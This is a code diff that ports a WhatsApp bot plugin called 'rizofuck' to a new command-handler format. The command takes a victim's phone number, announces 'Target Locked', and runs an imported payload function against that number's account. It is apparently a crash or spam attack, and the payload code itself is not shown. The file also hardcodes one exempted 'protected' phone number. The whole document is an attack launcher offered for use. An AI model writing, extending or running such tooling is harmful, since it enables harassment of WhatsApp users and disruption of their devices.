@@ -1,31 +1,44 @@
-const { rizofuck } = require('../lib/rizofuck');
+// plugins/rizofuck.js
+const { cmd } = require("../arslan");
 
-module.exports = {
-  name: "rizofuck",
-  commands: ['rizofuck', 'rzfuck', 'fuck'],
-  category: "owner",
-  description: "Execute high-speed interaction loop",
-  async execute(sock, m, args) {
+let { rizofuck } = require('../lib/rizofuck');
+
+let handler = async (m, { conn, args, command, isCreator }) => {
+    if (!isCreator) return m.reply('🔒 *Owner Only - Rizofuck Command!*');
+
     if (!args[0]) {
-      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizofuck 923xx` }, { quoted: m });
+        return m.reply(`📌 *Usage:* .${command} 923xx`);
     }
 
     let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });
+
+    if (!pepec) {
+        return m.reply('❌ *Invalid number format!*');
+    }
 
     let protectedNumbers = ["923154734548"];
     if (protectedNumbers.includes(pepec)) {
-      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
+        return m.reply('🔒 *This number is protected!*');
     }
 
     let target = pepec + '@s.whatsapp.net';
-    await sock.sendMessage(m.chat, { text: `💀 *Rizofuck Target Locked:* ${pepec}\n⚡ *Executing sequence...*` }, { quoted: m });
+
+    await m.reply(`💀 *Rizofuck Target Locked:* ${pepec}\n⚡ *Executing sequence...*`);
 
     try {
-      await rizofuck(sock, target);
-      await sock.sendMessage(m.chat, { react: { text: "💀", key: m.key } });
+        await rizofuck(conn, target);
+
+        await conn.sendMessage(m.chat, {
+            react: { text: "💀", key: m.key }
+        });
+
     } catch (error) {
-      await sock.sendMessage(m.chat, { text: "⚠️ Error: Payload execute karte waqt masla aaya hai." }, { quoted: m });
+        console.error(error);
+        m.reply("⚠️ Error: Payload execute karte waqt masla aaya hai.");
     }
-  }
-};
+}
+
+handler.command = ['rizofuck', 'rzfuck', 'fuck'];
+handler.tags = ['owner', 'rizo'];
+handler.help = ['rizofuck 923xx'];
+module.exports = handler;
